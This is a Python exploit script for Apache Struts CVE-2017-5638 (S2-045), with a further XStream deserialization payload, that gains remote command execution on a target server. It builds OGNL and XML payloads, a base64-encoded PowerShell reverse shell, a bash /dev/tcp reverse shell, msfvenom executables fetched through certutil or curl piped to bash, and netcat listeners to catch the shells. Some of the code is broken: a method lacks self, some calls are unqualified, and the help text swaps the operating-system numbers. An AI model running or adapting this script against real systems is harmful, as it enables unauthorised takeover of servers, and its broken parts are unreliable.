# Author (m4ud)
# Apache Struts-045
# CVE : 2017-5638
from base64 import b64encode
import sys
import requests
from optparse import OptionParser
import os
import subprocess
import http.server
import threading
import time

def serverShutdown(server):
	server = struts(options)
	server.stop()
	print("Shutting Server down!")

class struts:
	def __init__(self, options):
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.rport = options.rport
		self.osys = options.osys
		self.lport = options.lport
		self.lhost = options.lhost
		self.wport = options.wport
		self.shell = options.shell
		self.xploit = options.xploit
		self.target = 'http://' + options.target #Vulnerable Server
		port = self.rport
		directory = self.directory # Struts Application directory
		cmd = self.command

	def srv(self):
		server_address = (self.lhost, int(self.wport))
		global httpd
		self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
		self.server_thread = threading.Thread(target=self.httpd.serve_forever)
		self.server_thread.start()
		print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
		print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
		return self.httpd

	def stop(self):
		print("\r\n[+] Shutting Server down! [+]\r\n")
		self.httpd.shutdown()
		self.httpd.server_close()

	def pwrsh(self):
		print("\r\n[+] (m4ud) AS-045 RCE [+]")
		print("\r\n[*] Deploying PowerShell [*]\r\n")
		payload = "$client = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "'," + str(self.lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS(m4ud) ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
		payload = b64encode(payload.encode('UTF-16LE')).decode()
		return payload


	def bsh():
		payload = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, str(self.lport))
		return payload

	def venom(self, shell, ext):
		os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ str(self.lport) + " -f "+ ext+ " > shelb")

	def exp(self):
		if self.osys == "1":
			shell = "windows"
			ext = "exe"
			if self.command is not None:
				cmd = self.command
				cmd = b64encode(cmd.encode('UTF-16LE')).decode()
			if self.shell == "1":
				cmd = self.pwrsh()
			elif self.shell == "2":
				self.venom(shell, ext)
				self.srv()
				os.system('mv shelb shelb.exe')
				cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe;.\shelb.exe" % (self.lhost, self.wport)
				cmd = b64encode(cmd.encode('UTF-16LE')).decode()

		if self.osys == "2":
			shell = "linux"
			ext = "elf"
			if self.shell == "1":
				cmd = bsh()
			elif self.shell == "2":
				venom(shell, ext)
				cmd = "curl http://%s/shelb |bash"
				cmd = bsh()

		URL = self.target + ':' + str(self.rport) + '/' + self.directory + '/'

		if self.xploit == "1":
			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='%s')." % cmd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'powershell.exe','-nop','-e',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"

			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}

		else:
			payload = """
			<map>
			  <entry>
			      <jdk.nashorn.internal.objects.NativeString>
			            <flags>0</flags>
			            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
			            <dataHandler>
			            	<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
			                	<is class="javax.crypto.CipherInputStream">
			                    	<cipher class="javax.crypto.NullCipher">
			                        	<initialized>false</initialized>
			                            <opmode>0</opmode>
			                            <serviceIterator class="javax.imageio.spi.FilterIterator">
			                            	<iter class="javax.imageio.spi.FilterIterator">
			                                	<iter class="java.util.Collections$EmptyIterator"/>
			                                    <next class="java.lang.ProcessBuilder">
			                                    	<command>
			                                        	<string>powershell.exe</string>
			                                            <string>-nop</string>
			                                            <string>-e</string>
			                                            <string>""" + cmd + """\n</string>
			                                        </command>
			                                        <redirectErrorStream>false</redirectErrorStream>
			                                    </next>                  
			                                </iter>
			                                <filter class="javax.imageio.ImageIO$ContainsFilter">
			                                	<method>
			                                	    <class>java.lang.ProcessBuilder</class>
			                                	    <name>start</name>
			                                	    <parameter-types/>
			                                	</method>
			                                	<name>mwxNZJ805CPS7DKLm1rUgET1</name>
			                                </filter>
			                                <next class="string">xkruIdjzook1CwMqglq04G0rmN0Sz</next>
			                            </serviceIterator>                
			                            <lock/>
			                        </cipher>              
			                        <input class="java.lang.ProcessBuilder$NullInputStream"/>
			                        <ibuffer></ibuffer>
			                        <done>false</done>
			                        <ostart>0</ostart>
			                        <ofinish>0</ofinish>
			                        <closed>false</closed>
			                    </is>            
			                    <consumed>false</consumed>
			                </dataSource>
			            	<transferFlavors/>
			            </dataHandler>
			            <dataLen>0</dataLen>
				        </value>
				    </jdk.nashorn.internal.objects.NativeString>
				    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				<entry>
					<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
					<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				</entry>
			</map>"""

			headers = {'Content-Type': 'application/xml', 'Connection': 'close',}

		if self.command is None and self.shell == "2" and self.xploit == "1":

			while True:
				try:
					f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
					r = requests.get(URL, headers=headers)
					f.communicate()

				except KeyboardInterrupt:
					t2 = threading.Thread(target=self.stop())
					t2.daemon = True
					t2.start()
					print("Bye")
					sys.exit()

		elif self.command is None and self.shell == "1" and self.xploit == "1":
			while True:
				try:
					f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
					r = requests.get(URL, headers=headers)
					f.communicate()

				except KeyboardInterrupt:
					print("Bye")
					sys.exit()

		elif self.command is not None:
			while True:
				try:
					r = requests.get(URL, headers=headers)
				except KeyboardInterrupt:
					print("Bye")
					sys.exit()

		elif self.command is None and self.shell == "2" and self.xploit == "2":
			while True:
				try:
					f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
					r = requests.post(URL, headers=headers, data=payload)
					f.communicate()

				except KeyboardInterrupt:
					t2 = threading.Thread(target=self.stop())
					t2.daemon = True
					t2.start()
					print("Bye")
					sys.exit()

#		elif self.command is None and self.shell == "1" and self.xploit == "1":
		else:
			while True:
				try:
					f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
					r = requests.post(URL, headers=headers, data=payload)
					f.communicate()

				except KeyboardInterrupt:
					print("Bye")
					sys.exit()


def main():
	parser = OptionParser()
	parser.add_option("-p", "--rport", dest="rport", default=8080, help="RPORT, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
	parser.add_option("-P", "--lport", dest="lport",default=443 ,help="LPORT")
	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
	parser.add_option("-s", "--shell", dest="shell", help="Shell type: 1 = powershell or bash, and 2 = msfvenom")
	parser.add_option("-x","--xploit", dest="xploit",default="1", help="1 = S2-045 and 2 = S2-51")
	(options, args) = parser.parse_args() 

	if options.target:
		server = struts(options)
		server.exp()

if __name__=="__main__": 
	main()

